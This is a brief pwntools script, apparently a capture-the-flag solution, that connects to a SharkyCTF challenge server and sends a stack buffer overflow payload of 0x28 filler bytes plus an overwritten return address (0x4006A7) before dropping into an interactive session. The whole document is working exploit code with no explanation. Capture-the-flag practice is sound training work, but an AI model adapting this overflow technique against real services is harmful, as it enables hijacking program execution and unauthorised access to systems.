from pwn import *

p = remote('sharkyctf.xyz', 20333)

payload = b'a' * 0x28 + p64(0x4006A7)

p.sendline(payload)
p.interactive()
